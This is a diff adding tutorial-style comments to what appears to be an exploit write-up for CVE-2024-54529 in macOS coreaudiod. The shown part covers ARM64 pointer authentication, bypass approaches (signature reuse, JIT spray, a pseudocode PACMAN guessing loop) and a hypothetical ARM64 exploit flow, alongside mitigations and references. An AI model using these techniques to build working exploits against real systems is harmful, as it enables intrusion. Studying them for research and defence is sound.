+ *   │                                                                         │
+ *   │   STACK PIVOT ATTACK:                                                   │
+ *   │   ────────────────────                                                  │
+ *   │   What if attacker can control SP at authentication time?               │
+ *   │                                                                         │
+ *   │   1. Attacker observes: function F at address A always has              │
+ *   │      SP = 0x7fff2000 at return time                                     │
+ *   │                                                                         │
+ *   │   2. Attacker leaks a signed return address from F:                     │
+ *   │      signed_ret = PAC(ret_addr, SP=0x7fff2000, key)                     │
+ *   │                                                                         │
+ *   │   3. Attacker pivots stack to 0x7fff2000 (via separate bug)             │
+ *   │                                                                         │
+ *   │   4. Attacker uses signed_ret at the pivoted location                   │
+ *   │      → Context matches! → Authentication succeeds!                      │
+ *   │                                                                         │
+ *   │   MITIGATION: Kernel diversifies stack locations (ASLR)                 │
+ *   │   COUNTER: Attacker might be able to predict/control SP                 │
+ *   │                                                                         │
+ *   │   ZERO CONTEXT:                                                         │
+ *   │   ──────────────                                                        │
+ *   │   Some pointers use context = 0 (PACIZB instead of PACIBSP).            │
+ *   │   These are more vulnerable to signature reuse because:                 │
+ *   │   - No position-dependent component                                     │
+ *   │   - Same address always has same signature                              │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BYPASS 4: JIT SPRAY
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * JIT (Just-In-Time) compilers generate executable code at runtime.
+ * This code may have WEAKER PAC enforcement than pre-compiled code.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    JIT AS PAC BYPASS VECTOR                             │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   WHY JIT IS INTERESTING:                                               │
+ *   │   ────────────────────────                                              │
+ *   │   • JIT compilers CREATE new executable code at runtime                 │
+ *   │   • This code must be made executable (mprotect/mmap)                   │
+ *   │   • JIT code often has different security properties                    │
+ *   │                                                                         │
+ *   │   JAVASCRIPTCORE (Safari's JS Engine):                                  │
+ *   │   ─────────────────────────────────────                                 │
+ *   │   JavaScriptCore compiles JavaScript to native ARM64 code.              │
+ *   │   This JIT-compiled code:                                               │
+ *   │   • Has entry points protected by PAC                                   │
+ *   │   • But internal code may use weaker protection                         │
+ *   │   • Function calls between JIT code may be less guarded                 │
+ *   │                                                                         │
+ *   │   ATTACK VECTOR:                                                        │
+ *   │   ──────────────                                                        │
+ *   │   1. Attacker crafts JavaScript that JIT-compiles to useful gadgets     │
+ *   │   2. JIT code is placed at predictable-ish addresses                    │
+ *   │   3. Attacker uses memory corruption to jump into JIT code              │
+ *   │   4. JIT code may have weak/no internal PAC checks                      │
+ *   │                                                                         │
+ *   │   APPLE'S MITIGATIONS:                                                  │
+ *   │   ─────────────────────                                                 │
+ *   │   • JIT region randomization                                            │
+ *   │   • W^X enforcement (memory is never both writable AND executable)      │
+ *   │   • Gigacage: isolated heap for JavaScript objects                      │
+ *   │   • JIT code signing requirements on iOS                                │
+ *   │                                                                         │
+ *   │   CURRENT STATE:                                                        │
+ *   │   ──────────────                                                        │
+ *   │   JIT spraying is MUCH harder on iOS than it used to be.                │
+ *   │   macOS has fewer restrictions but still has mitigations.               │
+ *   │   Successful JIT attacks are rare and require multiple bugs.            │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * BYPASS 5: PACMAN-STYLE ATTACKS (SPECULATIVE EXECUTION)
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * The PACMAN attack, published by MIT researchers in 2022, demonstrated that
+ * PAC could potentially be bypassed using SPECULATIVE EXECUTION side channels.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │                    PACMAN ATTACK OVERVIEW                               │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   THE RESEARCH (MIT, 2022):                                             │
+ *   │   ──────────────────────────                                            │
+ *   │   Paper: "PACMAN: Attacking ARM Pointer Authentication with            │
+ *   │           Speculative Execution"                                        │
+ *   │   Authors: Joseph Ravichandran, Weon Taek Na, Jay Lang,                 │
+ *   │            Mengjia Yan                                                  │
+ *   │   Website: https://pacmanattack.com/                                    │
+ *   │                                                                         │
+ *   │   THE CORE INSIGHT:                                                     │
+ *   │   ──────────────────                                                    │
+ *   │   PAC authentication can happen SPECULATIVELY.                          │
+ *   │   The CPU might:                                                        │
+ *   │     1. Speculatively execute an AUT instruction                         │
+ *   │     2. Continue executing with the (maybe invalid) pointer              │
+ *   │     3. Roll back if authentication actually fails                       │
+ *   │                                                                         │
+ *   │   But speculative execution leaves SIDE EFFECTS:                        │
+ *   │     - Cache state changes                                               │
+ *   │     - TLB modifications                                                 │
+ *   │     - Branch predictor training                                         │
+ *   │                                                                         │
+ *   │   THE ATTACK:                                                           │
+ *   │   ───────────                                                           │
+ *   │                                                                         │
+ *   │   ┌───────────────────────────────────────────────────────────────┐     │
+ *   │   │                                                               │     │
+ *   │   │  for each possible PAC signature (2^16 or so):                │     │
+ *   │   │      guess_ptr = target_addr | (guess << 48)                  │     │
+ *   │   │                                                               │     │
+ *   │   │      // Prime cache                                           │     │
+ *   │   │      flush_cache(oracle_address)                              │     │
+ *   │   │                                                               │     │
+ *   │   │      // Trigger speculative authentication                    │     │
+ *   │   │      speculatively_authenticate_and_access(guess_ptr)         │     │
+ *   │   │                                                               │     │
+ *   │   │      // Measure cache timing                                  │     │
+ *   │   │      if (is_cached(oracle_address)):                          │     │
+ *   │   │          // Speculative access happened → correct guess!      │     │
+ *   │   │          return guess                                         │     │
+ *   │   │                                                               │     │
+ *   │   └───────────────────────────────────────────────────────────────┘     │
+ *   │                                                                         │
+ *   │   WHY THIS IS HARD TO EXPLOIT:                                          │
+ *   │   ─────────────────────────────                                         │
+ *   │   • Requires VERY precise timing measurements                           │
+ *   │   • Needs a memory corruption bug to USE the leaked signature           │
+ *   │   • Kernel PAC keys are different from userspace keys                   │
+ *   │   • Many conditions must align perfectly                                │
+ *   │                                                                         │
+ *   │   APPLE'S RESPONSE:                                                     │
+ *   │   ──────────────────                                                    │
+ *   │   Apple acknowledged the research but noted:                            │
+ *   │   "This technique requires an existing memory corruption                │
+ *   │    vulnerability to be present, and is not sufficient on its own       │
+ *   │    to bypass PAC-based security features."                              │
+ *   │                                                                         │
+ *   │   HARDWARE MITIGATIONS (M2 and later):                                  │
+ *   │   ────────────────────────────────────                                  │
+ *   │   • Speculative authentication restrictions                             │
+ *   │   • Enhanced speculation barriers                                       │
+ *   │   • These make PACMAN-style attacks significantly harder               │
+ *   │                                                                         │
+ *   │   PRACTICAL IMPACT:                                                     │
+ *   │   ──────────────────                                                    │
+ *   │   PACMAN showed PAC isn't perfect, but:                                 │
+ *   │   • No known real-world exploits using this technique                   │
+ *   │   • Requires combining multiple complex bugs                            │
+ *   │   • Apple has deployed mitigations                                      │
+ *   │   • Still raises the bar significantly vs. no PAC                       │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * =============================================================================
+ * 16.5 CVE-2024-54529 ON ARM64: WHAT CHANGES
+ * =============================================================================
+ *
+ * Now let's apply this knowledge to our specific vulnerability. What happens
+ * when we try to exploit CVE-2024-54529 on Apple Silicon?
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              CVE-2024-54529: x86-64 vs ARM64                            │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   THE BUG ITSELF:                                                       │
+ *   │   ────────────────                                                      │
+ *   │   The type confusion vulnerability EXISTS on ARM64.                     │
+ *   │   The bug is in the SOURCE CODE, not the architecture.                  │
+ *   │                                                                         │
+ *   │   • Object ID lookup without type check: SAME BUG                       │
+ *   │   • Engine object used as IOContext: SAME BUG                           │
+ *   │   • Offset 0x68 read as workgroup_port: SAME BUG                        │
+ *   │                                                                         │
+ *   │   The vulnerability is IDENTICAL. What changes is EXPLOITATION.         │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * THE VULNERABLE CODE PATH ON ARM64:
+ * ──────────────────────────────────
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │          EXPLOITATION FLOW: WHERE PAC INTERVENES                        │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   1. MESSAGE RECEIVED                                                   │
+ *   │      └─→ mach_msg_receive() in coreaudiod                               │
+ *   │          └─→ [No PAC impact - just data]                                │
+ *   │                                                                         │
+ *   │   2. OBJECT LOOKUP                                                      │
+ *   │      └─→ CopyObjectByObjectID(attacker_controlled_id)                   │
+ *   │          └─→ Returns Engine object (we control this via heap spray)     │
+ *   │          └─→ [No PAC impact - object lookup is data operation]          │
+ *   │                                                                         │
+ *   │   3. TYPE CONFUSION CAST                                                │
+ *   │      └─→ (HALS_IOContext *)engine_object                                │
+ *   │          └─→ [No PAC impact - cast is compile-time, not runtime]        │
+ *   │                                                                         │
+ *   │   4. OFFSET READ ★ FIRST POTENTIAL PAC CHECK ★                          │
+ *   │      └─→ ptr = *(void **)(object + 0x68)                                │
+ *   │          └─→ On x86-64: Just a memory read, no check                    │
+ *   │          └─→ On ARM64:  If ptr is PAC-signed data pointer...            │
+ *   │                         └─→ Depends on what offset 0x68 normally holds  │
+ *   │                                                                         │
+ *   │   5. POINTER DEREFERENCE ★ SECOND POTENTIAL PAC CHECK ★                 │
+ *   │      └─→ value = *ptr (or ptr->something)                               │
+ *   │          └─→ On x86-64: Direct dereference                              │
+ *   │          └─→ On ARM64:  If ptr was signed, may need authentication      │
+ *   │                                                                         │
+ *   │   6. FUNCTION POINTER CALL ★ DEFINITE PAC CHECK ★                       │
+ *   │      └─→ func_ptr()  (if our ROP chain tries to call something)         │
+ *   │          └─→ On x86-64: RET to attacker-controlled address              │
+ *   │          └─→ On ARM64:  RETAB authenticates return address              │
+ *   │                         └─→ Attacker's address has WRONG SIGNATURE      │
+ *   │                         └─→ Authentication FAILS                        │
+ *   │                         └─→ CRASH, not code execution                   │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * WHY NAIVE ROP FAILS:
+ * ────────────────────
+ *
+ * On x86-64, our ROP chain works like this:
+ *
+ *     Stack:  [gadget1_addr] [gadget2_addr] [gadget3_addr] ...
+ *                   │
+ *     RET  ─────────┘
+ *     (pops gadget1_addr, jumps there)
+ *
+ *     gadget1: pop rdi; ret  ←── executes, then RET to gadget2
+ *     gadget2: pop rsi; ret  ←── executes, then RET to gadget3
+ *     ...
+ *
+ * On ARM64 with PAC:
+ *
+ *     Stack:  [gadget1_addr] [gadget2_addr] [gadget3_addr] ...
+ *                   │
+ *     RETAB  ───────┘
+ *     (loads gadget1_addr into X30)
+ *     (authenticates X30 with current SP as context)
+ *
+ *     AUTHENTICATION FAILS!
+ *     - gadget1_addr has NO valid PAC signature
+ *     - Or has signature for WRONG context
+ *
+ *     Result: X30 is CORRUPTED, branch faults, CRASH
+ *
+ * The entire premise of ROP—that you can chain returns through
+ * attacker-controlled addresses—is BROKEN by PAC.
+ *
+ * WHAT WOULD BE NEEDED FOR ARM64 EXPLOITATION:
+ * ────────────────────────────────────────────
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              HYPOTHETICAL ARM64 EXPLOITATION REQUIREMENTS               │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   OPTION A: Find Non-PAC Code Paths                                     │
+ *   │   ────────────────────────────────                                      │
+ *   │   Some code paths might not use RETAB:                                  │
+ *   │   - Legacy code compiled without PAC                                    │
+ *   │   - Inline assembly that uses plain RET                                 │
+ *   │   - Third-party libraries                                               │
+ *   │                                                                         │
+ *   │   For coreaudiod: UNLIKELY. Apple's system daemons are compiled         │
+ *   │   with full PAC support.                                                │
+ *   │                                                                         │
+ *   │   OPTION B: Find a Signing Gadget                                       │
+ *   │   ─────────────────────────────                                         │
+ *   │   Code that would sign our malicious pointer:                           │
+ *   │   - Callback registration that signs user input                         │
+ *   │   - Deserialization that recreates signed pointers                      │
+ *   │                                                                         │
+ *   │   For coreaudiod: Would need deep code audit. Not obviously present.   │
+ *   │                                                                         │
+ *   │   OPTION C: Leak and Reuse Signatures                                   │
+ *   │   ──────────────────────────────────                                    │
+ *   │   Use the type confusion to READ signed pointers:                       │
+ *   │   - Leak isa pointers (signed with DA key)                              │
+ *   │   - Leak function pointers (signed with IB key)                         │
+ *   │   - Reuse these signatures where context matches                        │
+ *   │                                                                         │
+ *   │   For coreaudiod: Would need info leak primitive, context prediction.   │
+ *   │                                                                         │
+ *   │   OPTION D: Target Data-Only Corruption                                 │
+ *   │   ────────────────────────────────────                                  │
+ *   │   Instead of code execution, corrupt DATA to achieve goals:             │
+ *   │   - Change security flags                                               │
+ *   │   - Modify file paths                                                   │
+ *   │   - Corrupt authentication state                                        │
+ *   │                                                                         │
+ *   │   For coreaudiod: Limited impact. Audio daemon doesn't hold             │
+ *   │   security-critical data that data-only corruption would help with.     │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * =============================================================================
+ * 16.6 HYPOTHETICAL ARM64 EXPLOIT FLOW
+ * =============================================================================
+ *
+ * Let's sketch what a HYPOTHETICAL ARM64 exploit would look like, assuming
+ * we had solutions to the PAC challenges. This is THEORETICAL—not implemented.
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────────┐
+ *   │              HYPOTHETICAL ARM64 EXPLOIT FLOW                                │
+ *   ├─────────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                             │
+ *   │   STEP 1: HEAP SPRAY (Same as x86-64)                                       │
+ *   │   ────────────────────────────────────                                      │
+ *   │   • Create many CFData objects with controlled content                      │
+ *   │   • Goal: predictable data at offset 0x68 of fake IOContext                 │
+ *   │   • This step is UNCHANGED from x86-64 exploit                              │
+ *   │                                                                             │
+ *   │   STEP 2: CREATE ENGINE OBJECT (Same as x86-64)                             │
+ *   │   ─────────────────────────────────────────────                             │
+ *   │   • Trigger Engine creation with specific size                              │
+ *   │   • Engine lands in heap hole prepared by spray                             │
+ *   │   • This step is UNCHANGED from x86-64 exploit                              │
+ *   │                                                                             │
+ *   │   STEP 3: TRIGGER TYPE CONFUSION (Same as x86-64)                           │
+ *   │   ─────────────────────────────────────────────────                         │
+ *   │   • Send message with Engine's object ID                                    │
+ *   │   • Handler treats Engine as IOContext                                      │
+ *   │   • This step is UNCHANGED from x86-64 exploit                              │
+ *   │                                                                             │
+ *   │   STEP 4: [NEW] PAC-VALID POINTER AT OFFSET 0x68                            │
+ *   │   ────────────────────────────────────────────────                          │
+ *   │   Here's where ARM64 diverges. Options:                                     │
+ *   │                                                                             │
+ *   │   4a. Unprotected Code Path:                                                │
+ *   │       • Find code that doesn't authenticate the pointer                     │
+ *   │       • Rare in Apple code, would need specific audit                       │
+ *   │                                                                             │
+ *   │   4b. Signature Leak and Reuse:                                             │
+ *   │       • Use read primitive to leak signed pointer                           │
+ *   │       • Place leaked signed pointer at offset 0x68                          │
+ *   │       • Requires: info leak bug, matching context                           │
+ *   │                                                                             │
+ *   │   4c. Signing Gadget:                                                       │
+ *   │       • Find code that signs attacker-controlled data                       │
+ *   │       • Call it to get validly-signed malicious pointer                     │
+ *   │       • Place signed pointer at offset 0x68                                 │
+ *   │                                                                             │
+ *   │   4d. Target JIT Code:                                                      │
+ *   │       • If target has JS engine, spray JIT code                             │
+ *   │       • JIT code might have weaker PAC enforcement                          │
+ *   │       • Not applicable to coreaudiod (no JS engine)                         │
+ *   │                                                                             │
+ *   │   STEP 5: [NEW] AUTHENTICATED RETURN CHAIN                                  │
+ *   │   ────────────────────────────────────────────                              │
+ *   │   Traditional ROP uses: [addr1][addr2][addr3]...                            │
+ *   │   ARM64 PAC requires: [signed_addr1][signed_addr2]...                       │
+ *   │                                                                             │
+ *   │   Each gadget address must have valid PAC for:                              │
+ *   │   • The exact address value                                                 │
+ *   │   • The SP value at that point in the chain                                 │
+ *   │   • The IB (Instruction B) key                                              │
+ *   │                                                                             │
+ *   │   Options:                                                                  │
+ *   │   • Find gadgets in non-PAC code (RET instead of RETAB)                     │
+ *   │   • Leak all necessary signatures (many info leak calls)                    │
+ *   │   • Use data-only attack instead of code execution                          │
+ *   │                                                                             │
+ *   │   STEP 6: ACHIEVE OBJECTIVE                                                 │
+ *   │   ──────────────────────────                                                │
+ *   │   If all previous steps succeed:                                            │
+ *   │   • Execute arbitrary code as _coreaudiod                                   │
+ *   │   • Or achieve data-only objective (modify state)                           │
+ *   │                                                                             │
+ *   └─────────────────────────────────────────────────────────────────────────────┘
+ *
+ * COMPLEXITY COMPARISON:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              x86-64 vs ARM64 EXPLOIT COMPLEXITY                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   STEP                        x86-64          ARM64                     │
+ *   │   ────                        ──────          ─────                     │
+ *   │   Heap spray                  Standard        Standard                  │
+ *   │   Object creation             Standard        Standard                  │
+ *   │   Type confusion              Standard        Standard                  │
+ *   │   Control pointer             Easy            HARD (need PAC bypass)    │
+ *   │   ROP chain                   Standard        VERY HARD (need signed)   │
+ *   │   Code execution              Achievable      Requires PAC bypass       │
+ *   │                                                                         │
+ *   │   OVERALL DIFFICULTY:         Moderate        Very High                 │
+ *   │                                                                         │
+ *   │   The bug is the SAME. The exploitation is MUCH HARDER on ARM64.        │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * =============================================================================
+ * 16.7 WHY APPLE SILICON IS HARDER (BUT NOT IMPOSSIBLE)
+ * =============================================================================
+ *
+ * Let's be precise about what PAC does and doesn't provide:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              REALISTIC ASSESSMENT OF PAC SECURITY                       │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   WHAT PAC DOES:                                                        │
+ *   │   ───────────────                                                       │
+ *   │   ✓ Breaks traditional ROP/JOP attacks                                  │
+ *   │   ✓ Protects return addresses on the stack                              │
+ *   │   ✓ Signs critical function pointers                                    │
+ *   │   ✓ Makes exploitation significantly more complex                       │
+ *   │   ✓ Requires additional bugs/techniques for bypass                      │
+ *   │   ✓ Raises the cost of exploitation substantially                       │
+ *   │                                                                         │
+ *   │   WHAT PAC DOESN'T DO:                                                  │
+ *   │   ─────────────────────                                                 │
+ *   │   ✗ Prevent the vulnerability from existing                             │
+ *   │   ✗ Protect all pointers (data pointers often unsigned)                 │
+ *   │   ✗ Stop data-only attacks                                              │
+ *   │   ✗ Prevent info leaks                                                  │
+ *   │   ✗ Make exploitation impossible (just harder)                          │
+ *   │   ✗ Protect against all speculative execution attacks                   │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * DEFENSE IN DEPTH:
+ * ─────────────────
+ *
+ * PAC is ONE layer in Apple's security stack. Others include:
+ *
+ *   • ASLR (Address Space Layout Randomization)
+ *   • Stack canaries
+ *   • Sandboxing (limits what exploited code can do)
+ *   • System Integrity Protection (SIP)
+ *   • Kernel Integrity Protection (KIP/KTRR/KTRW)
+ *   • Secure Boot chain
+ *   • Code signing requirements
+ *   • Hardened runtime
+ *
+ * Each layer must be bypassed. PAC adds one more hurdle.
+ *
+ * REAL-WORLD PAC BYPASSES:
+ * ────────────────────────
+ *
+ * PAC has been bypassed in real-world exploits, but it's RARE and EXPENSIVE:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              KNOWN PAC BYPASS RESEARCH                                  │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   PACMAN (2022) - MIT:                                                  │
+ *   │   • Speculative execution side channel                                  │
+ *   │   • Demonstrated PAC signature leakage                                  │
+ *   │   • Requires existing memory corruption bug                             │
+ *   │   • Mitigated in newer chips (M2+)                                      │
+ *   │                                                                         │
+ *   │   ForcedEntry (2021) - NSO Group:                                       │
+ *   │   • Zero-click iMessage exploit                                         │
+ *   │   • Bypassed PAC through unknown technique                              │
+ *   │   • Demonstrated nation-state capability                                │
+ *   │   • Details not fully public                                            │
+ *   │                                                                         │
+ *   │   Various Jailbreaks:                                                   │
+ *   │   • Kernel exploits have bypassed PAC                                   │
+ *   │   • Usually through signing gadgets or context confusion                │
+ *   │   • Techniques are patched in subsequent iOS versions                   │
+ *   │                                                                         │
+ *   │   KEY OBSERVATION:                                                      │
+ *   │   ─────────────────                                                     │
+ *   │   PAC bypasses exist, but they're:                                      │
+ *   │   • Expensive to develop (nation-state level)                           │
+ *   │   • Quickly patched when discovered                                     │
+ *   │   • Not generic (exploit-specific)                                      │
+ *   │                                                                         │
+ *   │   The bar is MUCH higher than x86-64 exploitation.                      │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * THE CAT-AND-MOUSE CONTINUES:
+ * ────────────────────────────
+ *
+ * Security is not a destination, it's a journey:
+ *
+ *   1990s: Stack buffer overflows → easy code execution
+ *   2000s: Stack canaries, NX bit → harder, but ROP works
+ *   2010s: ASLR everywhere → need info leak, but still feasible
+ *   2020s: PAC, CFI, MTE → much harder, need multiple bugs
+ *   Future: ???
+ *
+ * Each defensive technology raises the bar. Attackers adapt. Defenders
+ * add new layers. The cost of exploitation increases over time, making
+ * attacks more expensive and less common.
+ *
+ * PAC is a significant step in this progression. It doesn't make
+ * exploitation impossible, but it makes it EXPENSIVE.
+ *
+ * =============================================================================
+ * 16.8 RESEARCH REFERENCES FOR PAC EXPLOITATION
+ * =============================================================================
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              ESSENTIAL PAC RESEARCH REFERENCES                          │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   FOUNDATIONAL RESEARCH:                                                │
+ *   │   ───────────────────────                                               │
+ *   │                                                                         │
+ *   │   "Examining Pointer Authentication on the iPhone XS"                   │
+ *   │   Google Project Zero, Brandon Azad (2019)                              │
+ *   │   https://googleprojectzero.blogspot.com/2019/02/                       │
+ *   │       examining-pointer-authentication-on.html                          │
+ *   │   → First comprehensive public analysis of Apple's PAC implementation  │
+ *   │   → Essential reading for understanding iOS PAC                         │
+ *   │                                                                         │
+ *   │   "PACMAN: Attacking ARM Pointer Authentication with                    │
+ *   │    Speculative Execution"                                               │
+ *   │   MIT (Ravichandran et al., 2022)                                       │
+ *   │   https://pacmanattack.com/                                             │
+ *   │   Paper: https://pacmanattack.com/paper.pdf                             │
+ *   │   → Demonstrated speculative execution bypass of PAC                    │
+ *   │   → Important for understanding PAC limitations                         │
+ *   │                                                                         │
+ *   │   "Pointer Authentication on ARMv8.3"                                   │
+ *   │   Qualcomm whitepaper (2017)                                            │
+ *   │   https://www.qualcomm.com/media/documents/files/                       │
+ *   │       whitepaper-pointer-authentication-on-armv8-3.pdf                  │
+ *   │   → Official ARM documentation of PAC design                            │
+ *   │                                                                         │
+ *   │   ─────────────────────────────────────────────────────────────────     │
+ *   │                                                                         │
+ *   │   iOS/macOS SECURITY RESEARCH:                                          │
+ *   │   ─────────────────────────────                                         │
+ *   │                                                                         │
+ *   │   Brandon Azad's Research:                                              │
+ *   │   https://github.com/bazad                                              │
+ *   │   → Extensive iOS kernel security research                              │
+ *   │   → KTRR/PAC/kernel exploitation techniques                             │
+ *   │                                                                         │
+ *   │   Ian Beer / Google Project Zero iOS Research:                          │
+ *   │   https://googleprojectzero.blogspot.com/search/label/iOS               │
+ *   │   → Multiple iOS exploitation writeups                                  │
+ *   │   → Task port, kernel, and userspace exploits                           │
+ *   │                                                                         │
+ *   │   Luca Todesco (@qwertyoruiop):                                         │
+ *   │   → iOS jailbreak research                                              │
+ *   │   → PAC bypass techniques in jailbreaks                                 │
+ *   │                                                                         │
+ *   │   ─────────────────────────────────────────────────────────────────     │
+ *   │                                                                         │
+ *   │   APPLE DOCUMENTATION:                                                  │
+ *   │   ─────────────────────                                                 │
+ *   │                                                                         │
+ *   │   Apple Platform Security Guide:                                        │
+ *   │   https://support.apple.com/guide/security/                             │
+ *   │   → Official documentation of security features                         │
+ *   │   → PAC mentioned in hardware security sections                         │
+ *   │                                                                         │
+ *   │   LLVM Pointer Authentication Documentation:                            │
+ *   │   https://clang.llvm.org/docs/PointerAuthentication.html                │
+ *   │   → Compiler-level PAC implementation details                           │
+ *   │   → Useful for understanding what gets signed                           │
+ *   │                                                                         │
+ *   │   ─────────────────────────────────────────────────────────────────     │
+ *   │                                                                         │
+ *   │   ACADEMIC PAPERS:                                                      │
+ *   │   ─────────────────                                                     │
+ *   │                                                                         │
+ *   │   "PAC it up: Towards Pointer Integrity using ARM Pointer               │
+ *   │    Authentication"                                                      │
+ *   │   Liljestrand et al., USENIX Security 2019                              │
+ *   │   → Analysis of PAC security properties                                 │
+ *   │                                                                         │
+ *   │   "Protecting the Stack with PACed Canaries"                            │
+ *   │   ARM Research (2019)                                                   │
+ *   │   → Combining PAC with stack canaries                                   │
+ *   │                                                                         │
+ *   │   "PTAuth: Temporal Memory Safety via Robust Points-to                  │
+ *   │    Authentication"                                                      │
+ *   │   Farkhani et al., USENIX Security 2021                                 │
+ *   │   → Using PAC for temporal safety                                       │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * =============================================================================
+ * 16.9 SUMMARY: ARM64 EXPLOITATION LANDSCAPE
+ * =============================================================================
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              KEY TAKEAWAYS                                              │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   1. THE BUG IS THE SAME                                                │
+ *   │      CVE-2024-54529 exists on ARM64. The type confusion is             │
+ *   │      architecture-independent. The vulnerability is VALID.              │
+ *   │                                                                         │
+ *   │   2. EXPLOITATION IS MUCH HARDER                                        │
+ *   │      PAC breaks traditional ROP chains. You can't just put             │
+ *   │      addresses on the stack and expect them to work.                    │
+ *   │                                                                         │
+ *   │   3. BYPASS APPROACHES EXIST BUT ARE EXPENSIVE                          │
+ *   │      Signing gadgets, PAC oracles, context confusion, JIT spray,       │
+ *   │      speculative execution attacks—all have been researched.           │
+ *   │      None are easy or generic.                                          │
+ *   │                                                                         │
+ *   │   4. APPLE ACTIVELY MITIGATES                                           │
+ *   │      Each PAC bypass technique gets patched. Newer chips have          │
+ *   │      additional protections. The target is moving.                      │
+ *   │                                                                         │
+ *   │   5. DEFENSE IN DEPTH MATTERS                                           │
+ *   │      PAC is one layer. Combined with ASLR, sandboxing, code            │
+ *   │      signing, etc., exploitation requires bypassing MANY defenses.     │
+ *   │                                                                         │
+ *   │   6. FOR THIS CVE                                                       │
+ *   │      On ARM64, CVE-2024-54529 is likely a DENIAL OF SERVICE            │
+ *   │      (crash) rather than code execution, unless a PAC bypass           │
+ *   │      is chained. The severity is LOWER on Apple Silicon.               │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────────┐
+ *   │              x86-64 vs ARM64 COMPARISON DIAGRAM                         │
+ *   ├─────────────────────────────────────────────────────────────────────────┤
+ *   │                                                                         │
+ *   │   x86-64 EXPLOIT CHAIN:                                                 │
+ *   │   ═════════════════════                                                 │
+ *   │                                                                         │
+ *   │   ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐             │
+ *   │   │  Type   │───▶│  Heap   │───▶│  ROP    │───▶│  Code   │             │
+ *   │   │Confusion│    │ Spray   │    │ Chain   │    │  Exec   │             │
+ *   │   └─────────┘    └─────────┘    └─────────┘    └─────────┘             │
+ *   │                                                                         │
+ *   │   Difficulty:   Low          Low          Medium       Achieved         │
+ *   │                                                                         │
+ *   │   ═══════════════════════════════════════════════════════════════════   │
+ *   │                                                                         │
+ *   │   ARM64 EXPLOIT CHAIN:                                                  │
+ *   │   ════════════════════                                                  │
+ *   │                                                                         │
+ *   │   ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐             │
+ *   │   │  Type   │───▶│  Heap   │───▶│   PAC   │─ ─▶│  Code   │             │
+ *   │   │Confusion│    │ Spray   │    │ Bypass  │    │  Exec   │             │
+ *   │   └─────────┘    └─────────┘    └────╳────┘    └─────────┘             │
+ *   │                                      │                                  │
+ *   │                                  BLOCKED                                │
+ *   │                               (need bypass)                             │
+ *   │                                                                         │
+ *   │   Difficulty:   Low          Low          VERY HIGH    Blocked          │
+ *   │                                                                         │
+ *   │   Without PAC bypass, ARM64 exploitation stops at step 3.               │
+ *   │   The same bug has DIFFERENT severity on different architectures.       │
+ *   │                                                                         │
+ *   └─────────────────────────────────────────────────────────────────────────┘
+ *
+ * This concludes PART 16. You now understand:
+ *   • How PAC works at the hardware level
+ *   • What gets signed and what doesn't
+ *   • Theoretical bypass approaches
+ *   • Why CVE-2024-54529 is harder to exploit on ARM64
+ *   • The current state of PAC security research
+ *
+ * The key insight: hardware security features like PAC don't eliminate
+ * vulnerabilities—they raise the cost of exploitation. A bug that's
+ * "easily exploitable" on x86-64 might require a nation-state-level
+ * effort on ARM64. That's meaningful progress in security.
+ *
+ * =============================================================================
+ * =============================================================================
  * APPENDIX A: NOTES FOR ELITE RESEARCHERS — WHAT'S MISSING & OPEN PROBLEMS
  * =============================================================================
  * =============================================================================
+ *
+ * ┌─────────────────────────────────────────────────────────────────────────┐
+ * │ AUDIENCE: Expert                                                        │
+ * │ PREREQUISITES: Complete understanding of preceding parts                │
+ * │ LEARNING OBJECTIVES:                                                    │
+ * │   • Open problems                                                       │
